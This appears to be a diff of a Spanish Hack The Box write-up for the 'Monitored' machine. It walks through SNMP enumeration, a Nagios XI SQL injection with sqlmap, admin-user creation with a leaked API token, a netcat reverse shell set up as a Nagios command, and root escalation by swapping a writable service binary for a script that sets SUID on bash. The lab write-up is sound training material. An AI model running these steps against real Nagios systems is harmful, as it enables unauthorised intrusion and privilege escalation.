@@ -4,13 +4,13 @@
 
 ***
 - Source: https://app.hackthebox.com/machines/Monitored
-- Dificultad: Medium
 - OS: Linux
-- IP: 10.10.11.248
-- Temas:
+- Dificultad: Medium
+- IP: 10.10.11.241
+- Temas: `API enumeration`, `CVE`, `SNMP`. `SQL Injection`, `service explotation`, `sudo`.
 ***
 
-- Escaneo de puertos:
+- Realizamos un escaneo de puertos:
 
 ~~~bash
 ┌──(kali💀Dedsec)-[~/Maquinas/Linux/Monitored]
@@ -55,11 +55,11 @@ Nmap done: 1 IP address (1 host up) scanned in 37.40 seconds
            Raw packets sent: 75822 (3.336MB) | Rcvd: 74906 (2.996MB)
 ~~~
 
-- URL:
+- Si seguimos la URL del puerto 80, veremos un login:
 
 ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/270c95de-9020-4fc2-b4ed-a2fbcf4dd562)
 
-- Fuzzing de directorios:
+- Como no hay nada interesante a simple vista, haremos un fuzzeo de directorios:
 
 ~~~bash
 ┌──(kali💀Dedsec)-[~/Maquinas/Linux/Monitored]
@@ -97,10 +97,8 @@ Starting gobuster in directory enumeration mode
 /terminal/            (Status: 200) [Size: 5215]
 ~~~
 
-- Hay una terminal:
-
-
-- Enumeramos la api:
+- Hay una terminal, pero nos pide loguearnos así que supongo que es un rabbit hole.
+- Enumeraremos la api, a ver si encontramos algo interesante, como versiones, etc:
 
 ~~~bash
 ┌──(kali💀Dedsec)-[~/Maquinas/Linux/Monitored]
@@ -123,6 +121,8 @@ Starting gobuster in directory enumeration mode
 /includes/            (Status: 403) [Size: 279]
 /v1/                  (Status: 200) [Size: 32]
 ~~~
+
+- Hay una versión `v1`, seguimos fuzzeando en esta ruta:
 
 ~~~bash
 ┌──(kali💀Dedsec)-[~/Maquinas/Linux/Monitored]
@@ -157,7 +157,8 @@ Starting gobuster in directory enumeration mode
 /DVD Tools/           (Status: 403) [Size: 279]
 ~~~
 
-- Todo esto es un rabbit hole xd
+- Hay varias rutas, en realidad nos toma como bueno todo lo que tenga espacios, así que solo tomaremos `license` y `authenticate`.
+- Aquí no pude hacer nada, porque la api nos solicitaba autenticación.
 - Escaneamos UDP, porque no encontré nada más:
 
 ~~~bash
@@ -239,6 +240,7 @@ iso.3.6.1.2.1.25.4.2.1.5.557 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /o
 https://monitored.htb/nagiosxi/login.php?token=<token>
 ~~~
 
+- Podemos ver el panel, en realidad no hay mucho que observar.
 - Tenemos una versión `Nagios XI 5.11.0 `.
 - Encontré un [exploit](https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567) para esta versión, basada en una inyección SQL.
 - Ejecutamos ``sqlmap`` en la ruta indicada y con los parametros por defecto que tiene la base de datos:
@@ -339,7 +341,9 @@ back-end DBMS: MySQL >= 5.0 (MariaDB fork)
 ~~~
 
 - Tenemos dos valores importantes para admin, un hash `$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0` y un token `IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL`.
-- Es unitil intentar romper el hash, así que podemos emplear el token para crear un usuario con permisos de administrador:
+- Es unitil intentar romper el hash, así que podemos emplear el token para crear un usuario con permisos de administrador. 
+- En este [paper](https://support.nagios.com/forum/viewtopic.php?f=16&t=42923) se nos dice como crear un usuario desde la api.
+- Encontré otro [documento](https://support.nagios.com/forum/viewtopic.php?p=276220) que nos indica como crear un usuario con nivel de autenticación de administrador.
 - Creamos un usuario con credenciales `hacker:hacker`:
 
 ~~~bash
@@ -351,7 +355,7 @@ back-end DBMS: MySQL >= 5.0 (MariaDB fork)
 }
 ~~~
 
-- Obtenemos su api key:
+- Siguiendo estos pasos, obtenemos una `api key`, con un usuario creado con permisos de admin:
 
 ~~~bash
 ┌──(kali💀Dedsec)-[~/Maquinas/Linux/Monitored]
@@ -364,29 +368,32 @@ back-end DBMS: MySQL >= 5.0 (MariaDB fork)
 
 ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/2d1bf2f8-528f-4004-b29a-31679bc9f201)
 
-Advanced config
+- Una vez en el panel de autenticación, nos dirigimos a `Advanced Configuration`:
 
 ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/1fa022a8-48c6-44fa-bc23-9dd5f35b6f29)
 
-Commads:
+- Entramos al apartado de ``commands``:
 
 ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/1bbb4a67-5c0e-4ccc-84b4-a775e8bc984b)
 
+- Podemos ver algunos existentes, pero crearemos el nuestro:
+
 ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/8bf1a302-90d9-4add-a3d5-b9f9d13a02d5)
 
-Creamos un comando con una revshell
+- Creamos uno, añadiendo una revshell en este.
+- **SPOILER**: Probé con varias, pero solo me funcionó la de `netcat`:
 
 ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/e9e467d9-f423-4aca-8a1e-d545dd089b1e)
 
-Presionamos aplicar configuración:
+- Presionamos aplicar configuración:
 
 ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/869850b3-ac63-4753-bafd-3beddb24a56f)
 
-Ahora nos vamos a Service management y seleccionamos el comando revshell en un servicio que ya exista, cambiando el comando por uno nuestro:
+- Ahora nos vamos a ``Service management`` y seleccionamos el comando revshell en un servicio que ya exista, cambiando el comando por uno nuestro:
 
 ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/752ec0f8-2880-48d6-96c9-602f47a0be9d)
 
-- Si presionamos `run command`, deberíamos ganar acceso y obtener la primera flag:
+- Si presionamos `run command`, y nos ponemos en escucha desde nuestra máquina, deberíamos ganar acceso y obtener la primera flag:
 
 ~~~bash
 ❯ nc -lvnp 4444
@@ -406,6 +413,7 @@ cat user.txt
 ~~~bash
 script /dev/null -c bash
 ^Z
+stty size
 stty raw -echo; fg
 reset xterm
 export TERM=xterm
@@ -414,9 +422,11 @@ stty rows 44 columns 184
 ~~~
 
 ***
+***
+
 ### PrivEsc
 
-- Sudo:
+- Verifiqué los permisos que teníamos para ejecutar con sudo:
 
 ~~~bash
 nagios@monitored:~$ sudo -l
@@ -460,7 +470,7 @@ second=("postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "
 - Hice una búsqueda recursiva para ver si alguno tenía permisos de escritura, pues si es así, podemos detener el servicio en cuestión, eliminarlo, y crear otro:
 
 ~~~bash
-bash-5.1$ while read -r bins; do find /usr/ -writable -name *"$bins"* 2>/dev/null; done < bins2w.txt | grep bin
+bash-5.1$ while read -r bins; do find / -writable -name *"$bins"* 2>/dev/null; done < bins2w.txt | grep bin
 /usr/local/nagios/bin/nagios
 /usr/local/nagios/bin/nagiostats
 /usr/local/nagios/bin/npcd.save
@@ -470,8 +480,7 @@ bash-5.1$ while read -r bins; do find /usr/ -writable -name *"$bins"* 2>/dev/nul
 ~~~
 
 - Tenemos dos binarios que aparecen, `nagios` y `npcd`.
-- Podemos revisar los permisos de estos, y en efecto podemos escribir sobre estos.
-- Utilizaré el binario de `nagios`.
+- Podemos revisar los permisos de estos, y en efecto podemos escribir sobre estos:
 
 ~~~bash
 bash-5.1$ ls -la /usr/local/nagios/bin/nagios
@@ -480,3 +489,48 @@ bash-5.1$ ls -la /usr/local/nagios/bin/npcd
 -rwxr-xr-x 1 nagios nagios 75 Feb 28 06:35 /usr/local/nagios/bin/npcd
 ~~~
 
+- Utilizaré el binario de `nagios` para esta prueba.
+- Detenemos el servicio:
+
+~~~bash
+bash-5.1$ sudo /usr/local/nagiosxi/scripts/manage_services.sh stop nagios
+~~~
+
+- Borramos y creamos un nuevo binario de ``nagios``, asignándole los mismos permisos que tenía previamente:
+
+~~~bash
+bash-5.1$ rm /usr/local/nagios/bin/nagios
+bash-5.1$ ls -la /usr/local/nagios/bin/nagios
+ls: cannot access '/usr/local/nagios/bin/nagios': No such file or directory
+bash-5.1$ nano /usr/local/nagios/bin/nagios
+bash-5.1$ cat /usr/local/nagios/bin/nagios
+#!/bin/bash
+chmod u+s /bin/bash
+bash-5.1$ chmod 774 /usr/local/nagios/bin/nagios
+~~~~
+
+- Iniciamos el servicio nuevamente, y deberíamos tener una bash SUID:
+
+~~~bash
+bash-5.1$ sudo /usr/local/nagiosxi/scripts/manage_services.sh start nagios
+Job for nagios.service failed because the control process exited with error code.
+See "systemctl status nagios.service" and "journalctl -xe" for details.
+bash-5.1$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+~~~
+
+- Ejecutamos la bash privilegiada y ya seríamos root:
+
+~~~bash
+bash-5.1$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+bash-5.1$ /bin/bash -p
+bash-5.1# whoami
+root
+bash-5.1# cd /root
+bash-5.1# cat root.txt 
+3ee53a655ab0ec462cb44d0d559d1b12
+~~~
+
+- Esta máquina fue bastante divertida, pone en practica elementos vitales como la enumeración de APIs, de manera retadora y práctica.
+- Creditos a [Hamibubu 🐧](https://github.com/Hamibubu), con quien resolví esta máquina en conjunto :).
